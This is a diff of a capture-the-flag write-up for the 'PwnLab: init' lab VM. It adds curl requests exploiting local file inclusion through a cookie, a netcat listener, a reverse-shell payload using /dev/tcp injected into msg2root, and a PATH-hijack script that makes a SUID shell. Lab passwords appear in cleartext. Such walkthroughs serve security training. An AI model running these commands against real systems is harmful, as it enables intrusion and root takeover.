@@ -1,5 +1,8 @@
 Wellcome to "PwnLab: init", my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.
 
+Local File Inclusion vulnerability ==> Read code source ==> Bypass File Upload Filtering ==> Modify cookie value ==> Reverse shell ==> Abuse SUID File execute (PATH environment) ==> command injection to get root shell
+
+
 ```bash
 
 └─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.44
@@ -200,11 +203,25 @@ Return to the page index
 Set a cookie with 
 name = lang 
 value = ../upload/3208fd203ca8fdfa13bc98a4832c1396.gif
+http://192.168.110.44/upload/3208fd203ca8fdfa13bc98a4832c1396.gif
+
+
+```bash
+# <label>Username: </label><input id="user" type="test" name="user"><br>
+# <label>Password: </label><input id="pass" type="password" name="pass"><br>
+# <input type="submit" name="submit" value="Login">
+# get cookie
+curl -s -c cookie -d "user=kent&pass=JWzXuBJJNy&submit=Login" http://192.168.110.44/login.php
+curl -s -b cookie -b "lang=../upload/3208fd203ca8fdfa13bc98a4832c1396.gif" http://192.168.110.44/index.php
+
+
+```
+
 
 
 ```bash
 
-$ nc -lp 1234 
+$ nc -lvp 1234 
 Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
  11:45:09 up 14 min,  0 users,  load average: 0.00, 0.01, 0.02
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -217,14 +234,6 @@ $ su kane
 su kane
 Password: iSv5Ym2GRo
 
-
-```
-``` bash
-
-kane@pwnlab:~$ cat cat 
-cat cat
-cp /bin/sh /tmp/sh
-chmod 4755 /tmp/sh
 
 ```
 
@@ -241,9 +250,7 @@ cat cat
 cp /bin/sh /tmp/sh
 chmod 4755 /tmp/sh
 kane@pwnlab:~$ export PATH=/home/kane:$PATH
-export PATH=/home/kane:$PATH
 kane@pwnlab:~$ echo $PATH
-echo $PATH
 /home/kane:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 kane@pwnlab:~$ chmod +x cat
 chmod +x cat
@@ -299,4 +306,11 @@ root
 
 ```
 
+
+```bash
+
+./msg2root
+Message for root: $(bash -i> /dev/tcp/192.168.110.1/4444 0>&1)
+
+```
 
